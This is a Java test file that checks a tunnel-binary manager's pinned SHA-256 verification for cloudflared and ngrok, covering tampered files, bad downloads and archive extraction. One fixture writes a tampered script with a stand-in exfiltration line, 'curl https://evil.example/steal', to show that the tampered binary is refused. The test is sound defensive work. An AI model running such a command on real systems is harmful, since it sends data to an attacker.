package ai.msrv.gaterook.core.tunnel.internal;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import ai.msrv.gaterook.core.platform.TestGateway;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.PosixFilePermissions;
import java.util.List;
import java.util.zip.GZIPOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import mockwebserver3.MockResponse;
import mockwebserver3.MockWebServer;
import okio.Buffer;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import tools.jackson.databind.JsonNode;
import tools.jackson.databind.json.JsonMapper;
import tools.jackson.databind.node.ObjectNode;

/**
 * The pinned tunnel agents (decision 8): cloudflared from the installer's resources, ngrok downloaded on demand — and
 * neither runs unless its SHA-256 is the pinned one.
 */
class TunnelBinariesTest {

  private static final JsonMapper JSON = JsonMapper.builder().build();
  private static final String PLATFORM = TunnelBinaries.platform(System.getProperty("os.name"),
      System.getProperty("os.arch"));

  private final MockWebServer server = new MockWebServer();
  private Path home;

  @BeforeEach
  void setUp() throws IOException {
    server.start();
    home = TestGateway.newHome("binaries");
  }

  @AfterEach
  void tearDown() {
    server.close();
  }

  @Test
  void theReleasePinsCoverEveryPlatformOfTheInstallers() throws IOException {
    JsonNode pins;
    try (var in = TunnelBinaries.class.getResourceAsStream("/ai/msrv/gaterook/core/tunnel/binaries.json")) {
      pins = JSON.readTree(in);
    }
    assertThat(pins.path("cloudflared").path("version").asString()).isEqualTo("2026.10.0");
    assertThat(pins.path("ngrok").path("version").asString()).isEqualTo("3.39.11");
    for (String tool : List.of("cloudflared", "ngrok")) {
      JsonNode platforms = pins.path(tool).path("platforms");
      for (String p : List.of("linux-x64", "linux-arm64", "darwin-x64", "darwin-arm64", "windows-x64")) {
        JsonNode pin = platforms.path(p);
        assertThat(pin.isObject()).as(tool + " " + p).isTrue();
        assertThat(pin.path("url").asString()).as(tool + " " + p).startsWith("https://");
        assertThat(pin.path("sha256").asString()).as(tool + " " + p).matches("[0-9a-f]{64}");
        assertThat(pin.path("binarySha256").asString()).as(tool + " " + p).matches("[0-9a-f]{64}");
        assertThat(pin.path("path").isMissingNode()).as("no local path in a release pin").isTrue();
        assertThat(pin.path("binary").asString()).isEqualTo(p.startsWith("windows") ? tool + ".exe" : tool);
      }
    }
    assertThat(pins.path("cloudflared").path("platforms").path("linux-x64").path("url").asString())
        .startsWith("https://github.com/cloudflare/cloudflared/releases/download/2026.10.0/");
    // A plain binary's two hashes are the same file's.
    JsonNode linux = pins.path("cloudflared").path("platforms").path("linux-x64");
    assertThat(linux.path("archive").asString()).isEqualTo("none");
    assertThat(linux.path("sha256").asString()).isEqualTo(linux.path("binarySha256").asString());
    assertThat(pins.path("ngrok").path("platforms").path("linux-x64").path("archive").asString()).isEqualTo("zip");
  }

  @Test
  void platformsAreNamedLikeTheBundle() {
    assertThat(TunnelBinaries.platform("Linux", "amd64")).isEqualTo("linux-x64");
    assertThat(TunnelBinaries.platform("Linux", "aarch64")).isEqualTo("linux-arm64");
    assertThat(TunnelBinaries.platform("Mac OS X", "aarch64")).isEqualTo("darwin-arm64");
    assertThat(TunnelBinaries.platform("Mac OS X", "x86_64")).isEqualTo("darwin-x64");
    assertThat(TunnelBinaries.platform("Windows 11", "amd64")).isEqualTo("windows-x64");
  }

  @Test
  void cloudflaredComesFromTheResourcesAndRunsOnlyWithItsPinnedHash() throws Exception {
    byte[] agent = "#!/bin/sh\necho cloudflared 2026.10.0\n".getBytes(StandardCharsets.US_ASCII);
    Path pins = pins(TunnelBinaries.sha256(agent), "none", TunnelBinaries.sha256(agent), "/unused");
    Path resources = Files.createDirectories(home.resolve("resources"));
    TunnelBinaries binaries = new TunnelBinaries(home, resources.toString(), pins.toString());

    assertThatThrownBy(binaries::cloudflared).isInstanceOf(TunnelException.class)
        .hasMessageContaining("missing from this installation");
    assertThat(binaries.cloudflaredStatus().present()).isFalse();
    assertThat(binaries.cloudflaredStatus().error()).isEqualTo("cloudflared is missing");

    Path file = resources.resolve("cloudflared").resolve(PLATFORM).resolve("cloudflared");
    Files.createDirectories(file.getParent());
    Files.write(file, agent);
    assertThat(binaries.cloudflared()).isEqualTo(file);
    TunnelBinaries.Status ok = binaries.cloudflaredStatus();
    assertThat(ok.present()).isTrue();
    assertThat(ok.sha256Ok()).isTrue();
    assertThat(ok.version()).isEqualTo("2026.10.0");
    assertThat(ok.error()).isNull();

    // Swapped on disk: never started, and the status says so.
    Files.writeString(file, "#!/bin/sh\ncurl https://evil.example/steal\n");
    assertThatThrownBy(binaries::cloudflared).isInstanceOf(TunnelException.class)
        .hasMessageContaining("doesn't match the SHA-256 pinned for cloudflared 2026.10.0");
    assertThat(binaries.cloudflaredStatus().sha256Ok()).isFalse();
    assertThat(binaries.cloudflaredStatus().error()).contains("doesn't match");
  }

  @Test
  void aDevelopmentRunDownloadsThePinnedCloudflaredOnce() throws Exception {
    byte[] agent = "#!/bin/sh\necho dev cloudflared\n".getBytes(StandardCharsets.US_ASCII);
    server.enqueue(new MockResponse.Builder().code(200).body(new Buffer().write(agent)).build());
    Path pins = pins(TunnelBinaries.sha256(agent), "none", TunnelBinaries.sha256(agent),
        server.url("/cloudflared-linux-amd64").toString());
    TunnelBinaries binaries = new TunnelBinaries(home, "", pins.toString());
    Path file = binaries.cloudflared();
    assertThat(file).isEqualTo(home.resolve("bin/cloudflared/2026.10.0/cloudflared"));
    assertThat(Files.readAllBytes(file)).isEqualTo(agent);
    assertThat(Files.getPosixFilePermissions(file)).isEqualTo(PosixFilePermissions.fromString("rwx------"));
    assertThat(binaries.cloudflared()).isEqualTo(file);
    assertThat(server.getRequestCount()).isEqualTo(1);
  }

  @Test
  void ngrokIsDownloadedOnDemandAndInstalledOnlyWhenBothHashesMatch() throws Exception {
    byte[] agent = "#!/bin/sh\necho ngrok version 3.39.11\n".getBytes(StandardCharsets.US_ASCII);
    byte[] zip = zip("ngrok", agent);
    Path pins = ngrokPins(TunnelBinaries.sha256(zip), "zip", TunnelBinaries.sha256(agent),
        server.url("/a/ngrok-v3-3.39.11-linux-amd64.zip").toString());
    TunnelBinaries binaries = new TunnelBinaries(home, "", pins.toString());
    assertThat(binaries.ngrok()).isEmpty();
    assertThat(binaries.ngrokStatus().present()).isFalse();

    // A tampered download: refused before anything lands.
    server.enqueue(new MockResponse.Builder().code(200).body(new Buffer().write(zip("ngrok",
        "#!/bin/sh\nevil\n".getBytes(StandardCharsets.US_ASCII)))).build());
    assertThatThrownBy(binaries::installNgrok).isInstanceOf(TunnelException.class)
        .hasMessageContaining("doesn't match its pinned SHA-256; nothing was installed");
    assertThat(binaries.ngrok()).isEmpty();
    assertThat(binaries.ngrokStatus().error()).contains("nothing was installed");

    server.enqueue(new MockResponse.Builder().code(404).build());
    assertThatThrownBy(binaries::installNgrok).isInstanceOf(TunnelException.class).hasMessageContaining("HTTP 404");

    server.enqueue(new MockResponse.Builder().code(200).body(new Buffer().write(zip)).build());
    Path file = binaries.installNgrok();
    assertThat(file).isEqualTo(home.resolve("bin/ngrok/3.39.11/ngrok"));
    assertThat(Files.readAllBytes(file)).isEqualTo(agent);
    assertThat(binaries.ngrok()).contains(file);
    assertThat(binaries.ngrokStatus().sha256Ok()).isTrue();
    assertThat(binaries.ngrokStatus().error()).isNull();
    assertThat(server.takeRequest().getHeaders().get("User-Agent")).isEqualTo("mcp-gateway");
    try (var dir = Files.list(file.getParent())) {
      assertThat(dir.map(p -> p.getFileName().toString())).containsExactly("ngrok");
    }

    // Already there and intact: no second download.
    int requests = server.getRequestCount();
    binaries.installNgrok();
    assertThat(server.getRequestCount()).isEqualTo(requests);
  }

  @Test
  void anArchiveWhoseAgentDoesntMatchIsRefusedToo() throws Exception {
    byte[] agent = "#!/bin/sh\necho ok\n".getBytes(StandardCharsets.US_ASCII);
    byte[] zip = zip("ngrok", agent);
    Path pins = ngrokPins(TunnelBinaries.sha256(zip), "zip", "0".repeat(64), server.url("/ngrok.zip").toString());
    server.enqueue(new MockResponse.Builder().code(200).body(new Buffer().write(zip)).build());
    TunnelBinaries binaries = new TunnelBinaries(home, "", pins.toString());
    assertThatThrownBy(binaries::installNgrok).isInstanceOf(TunnelException.class)
        .hasMessageContaining("agent in the download doesn't match");
    assertThat(home.resolve("bin/ngrok/3.39.11/ngrok")).doesNotExist();
  }

  @Test
  void archivesYieldOnlyTheNamedTopLevelFile() throws IOException {
    byte[] agent = "binary".getBytes(StandardCharsets.US_ASCII);
    assertThat(TunnelBinaries.fromZip(zip("ngrok", agent), "ngrok")).isEqualTo(agent);
    assertThatThrownBy(() -> TunnelBinaries.fromZip(zip("other", agent), "ngrok")).hasMessageContaining("no ngrok");

    byte[] tgz = tgz(List.of(new Entry("README.md", "readme".getBytes(StandardCharsets.US_ASCII), '0'),
        new Entry("./", new byte[0], '5'), new Entry("./cloudflared", agent, '0')));
    assertThat(TunnelBinaries.fromTarGz(tgz, "cloudflared")).isEqualTo(agent);
    byte[] link = tgz(List.of(new Entry("cloudflared", new byte[0], '2')));
    assertThatThrownBy(() -> TunnelBinaries.fromTarGz(link, "cloudflared")).hasMessageContaining("no cloudflared");
    byte[] nested = tgz(List.of(new Entry("bin/cloudflared", agent, '0')));
    assertThatThrownBy(() -> TunnelBinaries.fromTarGz(nested, "cloudflared")).hasMessageContaining("no cloudflared");
  }

  // ── Helpers ─────────────────────────────────────────────────────────────────────────────────────────────────

  private Path pins(String sha, String archive, String binarySha, String url) throws IOException {
    ObjectNode root = JSON.createObjectNode();
    ObjectNode p = root.putObject("cloudflared").put("version", "2026.10.0").putObject("platforms")
        .putObject(PLATFORM);
    p.put("url", url).put("sha256", sha).put("archive", archive).put("binary", "cloudflared")
        .put("binarySha256", binarySha);
    root.putObject("ngrok").put("version", "3.39.11").putObject("platforms");
    Path file = home.resolve("pins.json");
    Files.writeString(file, root.toString());
    return file;
  }

  private Path ngrokPins(String sha, String archive, String binarySha, String url) throws IOException {
    ObjectNode root = JSON.createObjectNode();
    ObjectNode p = root.putObject("ngrok").put("version", "3.39.11").putObject("platforms").putObject(PLATFORM);
    p.put("url", url).put("sha256", sha).put("archive", archive).put("binary", "ngrok").put("binarySha256", binarySha);
    Path file = home.resolve("pins-ngrok.json");
    Files.writeString(file, root.toString());
    return file;
  }

  private static byte[] zip(String name, byte[] content) throws IOException {
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    try (ZipOutputStream z = new ZipOutputStream(out)) {
      z.putNextEntry(new ZipEntry("docs/"));
      z.closeEntry();
      z.putNextEntry(new ZipEntry(name));
      z.write(content);
      z.closeEntry();
    }
    return out.toByteArray();
  }

  private record Entry(String name, byte[] data, char type) {}

  /** A gzipped ustar archive, written by hand like the release tarballs are laid out. */
  private static byte[] tgz(List<Entry> entries) throws IOException {
    ByteArrayOutputStream raw = new ByteArrayOutputStream();
    for (Entry e : entries) {
      byte[] h = new byte[512];
      put(h, 0, e.name());
      put(h, 100, "0000755");
      put(h, 108, "0000000");
      put(h, 116, "0000000");
      put(h, 124, String.format("%011o", e.data().length));
      put(h, 136, String.format("%011o", 0));
      h[156] = (byte) e.type();
      put(h, 257, "ustar");
      put(h, 263, "00");
      for (int i = 148; i < 156; i++) {
        h[i] = ' ';
      }
      int sum = 0;
      for (byte b : h) {
        sum += b & 0xff;
      }
      put(h, 148, String.format("%06o", sum));
      h[154] = 0;
      raw.write(h);
      raw.write(e.data());
      int pad = (512 - e.data().length % 512) % 512;
      raw.write(new byte[pad]);
    }
    raw.write(new byte[1024]);
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    try (GZIPOutputStream gz = new GZIPOutputStream(out)) {
      gz.write(raw.toByteArray());
    }
    return out.toByteArray();
  }

  private static void put(byte[] header, int offset, String value) {
    byte[] b = value.getBytes(StandardCharsets.US_ASCII);
    System.arraycopy(b, 0, header, offset, b.length);
  }
}
